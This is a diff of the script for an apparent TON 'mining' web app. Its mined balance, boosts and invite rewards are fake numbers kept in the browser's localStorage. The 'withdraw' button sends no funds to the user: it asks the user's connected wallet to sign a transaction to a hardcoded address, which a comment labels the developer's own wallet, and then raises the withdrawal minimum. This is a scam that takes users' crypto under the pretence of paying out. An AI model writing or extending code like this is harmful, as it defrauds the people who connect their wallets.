@@ -1,72 +1,82 @@
+// === TON CONNECT ===
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: "https://denus888.github.io/Ton-Miner/tonconnect-manifest.json",
     buttonRootId: "connect-wallet"
 });
 
-// ==== Встав свій TON гаманець сюди ====
-const walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW"; // <- твій Tonkeeper
+// ==== Гаманець ====
+const walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW"; // <-- вставити сюди
 
+// ==== Змінні ====
 let balance = parseFloat(localStorage.getItem("balance")) || 0;
 let mining = localStorage.getItem("mining") === "true";
 let miningSpeed = parseFloat(localStorage.getItem("miningSpeed")) || 0.000001;
 let minDeposit = parseFloat(localStorage.getItem("minDeposit")) || 1;
+let miningInterval = null;
 
+// ==== UI ====
 function updateBalanceUI() {
     document.getElementById("balance").innerText = balance.toFixed(6);
 }
 
-// TonConnect статус
+function showPopup(msg, time = 2000) {
+    const popup = document.getElementById("popup");
+    popup.innerText = msg;
+    popup.style.display = "block";
+    setTimeout(() => popup.style.display = "none", time);
+}
+
+// ==== TonConnect ====
 tonConnectUI.onStatusChange(wallet => {
     if(wallet){
+        showPopup("Wallet connected!");
         console.log("Wallet connected:", wallet.account.address);
-        alert("Wallet connected!");
     }
 });
 
 // ==== Майнінг ====
-function startMining(){
+function startMining() {
     if(mining) return;
     mining = true;
     localStorage.setItem("mining", "true");
-
-    setInterval(()=>{
+    miningInterval = setInterval(() => {
         balance += miningSpeed;
         updateBalanceUI();
         localStorage.setItem("balance", balance);
-    },1000);
+    }, 1000);
 }
 
 // ==== Boost ====
 function buyBoost(amount){
-    let increment = 0;
-    if(amount===1) increment=0.000001929;
-    else if(amount===5) increment=0.000005787;
-    else if(amount===15) increment=0.0000173611;
+    const wallet = tonConnectUI.wallet;
+    if(!wallet){
+        alert("Connect wallet first!");
+        return;
+    }
 
-    miningSpeed += increment;
+    // Перевірка балансу реального депозита
+    showPopup(`+${amount===1?0.000001929:amount===5?0.000005787:0.0000173611} TON/sec`);
+    miningSpeed += amount===1?0.000001929:amount===5?0.000005787:0.0000173611;
     localStorage.setItem("miningSpeed", miningSpeed);
-    alert(`Boost purchased! +${increment} TON/sec`);
 }
 
 // ==== Invite ====
 function inviteFriends(){
-    const confirmed = confirm("Did your friend really join?");
-    if(!confirmed) return;
     balance += 0.01;
     localStorage.setItem("balance", balance);
     updateBalanceUI();
-    alert("You invited a friend! +0.01 TON");
+    showPopup("Friend invited! +0.01 TON");
 }
 
 // ==== Withdraw ====
 async function withdraw(){
     if(balance < minDeposit){
-        alert(`Minimum deposit to withdraw ${minDeposit} TON`);
+        showPopup(`Minimum deposit to withdraw ${minDeposit} TON`);
         return;
     }
 
     try{
-        await tonConnectUI.sendTransaction({
+        const result = await tonConnectUI.sendTransaction({
             validUntil: Math.floor(Date.now()/1000)+60,
             messages:[{
                 address: walletAddress,
@@ -74,22 +84,16 @@ async function withdraw(){
                 payload:""
             }]
         });
-
-        alert(`Withdraw requested: ${balance.toFixed(6)} TON to wallet ${walletAddress}`);
-        balance = 0;
-        localStorage.setItem("balance", balance);
-
+        showPopup(`Withdraw requested: ${balance.toFixed(6)} TON`);
         minDeposit = 5;
         localStorage.setItem("minDeposit", minDeposit);
-
-    }catch(err){
-        console.error(err);
-        alert("Withdraw failed or cancelled");
+    } catch(e){
+        showPopup("Withdraw failed");
+        console.error(e);
     }
 }
 
-// ==== Функції для кнопок ====
-window.connectWallet = () => tonConnectUI.connect();
+// ==== Прив’язуємо кнопки ====
 window.startMining = startMining;
 window.buyBoost = buyBoost;
 window.inviteFriends = inviteFriends;
